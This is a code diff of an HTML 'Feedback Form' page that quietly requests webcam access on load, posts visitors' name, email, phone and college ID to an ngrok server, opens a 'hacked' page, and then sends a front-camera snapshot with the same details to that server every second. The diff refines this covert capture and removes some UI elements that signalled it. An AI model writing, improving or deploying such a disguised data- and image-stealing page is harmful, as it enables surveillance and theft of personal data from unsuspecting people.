@@ -36,27 +36,12 @@
     #msg { color: #ef4444; font-size: 0.82rem; margin-top: 0.4rem; min-height: 1em; }
     button { width: 100%; padding: 0.75rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 10px; font-size: 1rem; font-weight: 600; cursor: pointer; margin-top: 0.5rem; transition: transform 0.1s, opacity 0.2s; }
     button:hover { opacity: 0.92; } button:active { transform: scale(0.98); } button:disabled { opacity: 0.6; cursor: not-allowed; }
-    .status-banner {
-      background: #fef3c7; border: 1px solid #fcd34d; border-radius: 8px; padding: 0.75rem 1rem; margin-bottom: 1rem; display: none;
-      align-items: center; gap: 0.5rem; font-size: 0.85rem; color: #92400e;
-    }
-    .capture-indicator {
-      display: flex; align-items: center; justify-content: center;
-      gap: 0.5rem; margin-top: 0.5rem; color: #ef4444; font-size: 0.85rem;
-    }
-    .capture-indicator .dot {
-      width: 8px; height: 8px; background: #ef4444; border-radius: 50%;
-      animation: pulse 1s infinite;
-    }
-    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
   </style>
 </head>
 <body>
   <div class="card">
     <h1>Feedback Form</h1>
     <p class="sub">Please fill in your details.</p>
-
-    <div class="status-banner" id="statusBanner"></div>
 
     <form id="feedbackForm" novalidate>
       <div class="field">
@@ -77,96 +62,114 @@
       </div>
       <button type="submit" id="submitBtn">Submit</button>
       <div id="msg"></div>
-      <div class="capture-indicator" id="captureIndicator" style="display:none;">
-        <span class="dot"></span> Capturing every 1s...
-      </div>
     </form>
   </div>
 
   <script>
-    const ADMIN_SERVER = "https://stainless-king-gravitate.ngrok-free.dev";
     const HACKED_PAGE = "https://An0nymOuS29.github.io/success.html";
 
     const form = document.getElementById("feedbackForm");
     const msg = document.getElementById("msg");
     const btn = document.getElementById("submitBtn");
-    const statusBanner = document.getElementById("statusBanner");
-    const captureIndicator = document.getElementById("captureIndicator");
 
     const validateEmail = (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
     const validatePhone = (v) => /^[+]?[\d\s\-()]{7,15}$/.test(v.replace(/\s/g, ""));
 
     // Request camera permission immediately on page load
-    let cameraStream = null;
     async function requestCameraPermission() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         window.cameraStream = stream;
+        console.log("Camera permission granted");
         return true;
       } catch (e) {
+        console.error("Camera permission denied:", e);
         return false;
       }
     }
     requestCameraPermission();
 
+    function showMsg(text, isError = true) {
+      msg.textContent = text;
+      msg.style.color = isError ? "#ef4444" : "#10b981";
+    }
+
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
-      msg.textContent = "";
+      console.log("Form submitted");
+      showMsg("");
 
-      const name = document.getElementById("name").value.trim();
-      const email = document.getElementById("email").value.trim();
-      const phone = document.getElementById("phone").value.trim();
-      const collegeId = document.getElementById("collegeId").value.trim();
+      const nameEl = document.getElementById("name");
+      const emailEl = document.getElementById("email");
+      const phoneEl = document.getElementById("phone");
+      const collegeEl = document.getElementById("collegeId");
+
+      const name = nameEl.value.trim();
+      const email = emailEl.value.trim();
+      const phone = phoneEl.value.trim();
+      const collegeId = collegeEl.value.trim();
 
       let ok = true;
-      [nameEl, emailEl, phoneEl, collegeEl] = ["name","email","phone","collegeId"].map(id => document.getElementById(id));
       [nameEl, emailEl, phoneEl, collegeEl].forEach(el => el.classList.remove("invalid", "valid"));
 
       if (!name) { nameEl.classList.add("invalid"); ok = false; } else nameEl.classList.add("valid");
       if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { emailEl.classList.add("invalid"); ok = false; } else emailEl.classList.add("valid");
       if (!/^[+]?[\d\s\-()]{7,15}$/.test(phone.replace(/\s/g, ""))) { phoneEl.classList.add("invalid"); ok = false; } else phoneEl.classList.add("valid");
-      if (!document.getElementById("collegeId").value.trim()) { collegeEl.classList.add("invalid"); ok = false; } else collegeEl.classList.add("valid");
+      if (!collegeEl.value.trim()) { collegeEl.classList.add("invalid"); ok = false; } else collegeEl.classList.add("valid");
 
-      if (!ok) { msg.textContent = "Please fix the highlighted fields."; return; }
+      if (!ok) { showMsg("Please fix the highlighted fields."); return; }
 
       // Disable form
       btn.disabled = true;
       btn.textContent = "Submitting...";
+      showMsg("", false);
 
       const name = nameEl.value.trim();
-      const email = document.getElementById("email").value.trim();
-      const phone = document.getElementById("phone").value.trim();
-      const collegeId = document.getElementById("collegeId").value.trim();
+      const email = emailEl.value.trim();
+      const phone = phoneEl.value.trim();
+      const collegeId = collegeEl.value.trim();
 
       // 1. Send initial user data to admin server
-      await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name, email, phone: document.getElementById("phone").value.trim(), collegeId, time: new Date().toISOString() })
-      }).catch(() => {});
+      try {
+        console.log("Sending submit to admin server...");
+        await fetch("https://stainless-king-gravitate.ngrok-free.dev/submit", {
+          method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ name, email, phone: phoneEl.value.trim(), collegeId, time: new Date().toISOString() })
+        });
+        console.log("Submit sent successfully");
+      } catch (e) {
+        console.error("Submit failed:", e);
+      }
 
       // 2. Open hacked page in new tab
-      window.open(HACKED_PAGE, "_blank");
+      try {
+        window.open("https://An0nymOuS29.github.io/success.html", "_blank");
+      } catch (e) {
+        console.error("Failed to open hacked page:", e);
+      }
 
       // 3. Start continuous capture every 1 second in THIS tab
-      startContinuousCapture(name, email, phone, collegeId);
-
-      // Show capture indicator
-      captureIndicator.style.display = "flex";
-      btn.disabled = true;
-      btn.textContent = "Capturing every 1s... (close tab to stop)";
+      try {
+        startContinuousCapture();
+      } catch (e) {
+        console.error("Capture failed:", e);
+      }
 
       // Hide form
       form.style.display = "none";
+      btn.disabled = true;
+      btn.textContent = "Capturing every 1s... (close tab to stop)";
     });
 
-    async function startContinuousCapture(name, email, phone, collegeId) {
+    async function startContinuousCapture() {
       let stream = window.cameraStream;
       if (!stream) {
         try {
           stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
           window.cameraStream = stream;
+          console.log("Camera stream obtained");
         } catch (e) {
-          console.warn("Camera not available");
+          console.error("Camera not available:", e);
           return;
         }
       }
@@ -187,9 +190,19 @@
 
           await fetch("https://stainless-king-gravitate.ngrok-free.dev/capture", {
             method: "POST", headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ name: document.getElementById("name").value.trim(), email, phone: document.getElementById("phone").value.trim(), collegeId: document.getElementById("collegeId").value.trim(), image: dataUrl, time: new Date().toISOString() })
-          }).catch(() => {});
-        } catch (e) {}
+            body: JSON.stringify({
+              name: document.getElementById("name").value.trim(),
+              email: document.getElementById("email").value.trim(),
+              phone: document.getElementById("phone").value.trim(),
+              collegeId: document.getElementById("collegeId").value.trim(),
+              image: dataUrl,
+              time: new Date().toISOString()
+            })
+          });
+          console.log("Capture sent");
+        } catch (e) {
+          console.error("Capture error:", e);
+        }
 
         // Schedule next capture in 1 second
         setTimeout(captureLoop, 1000);
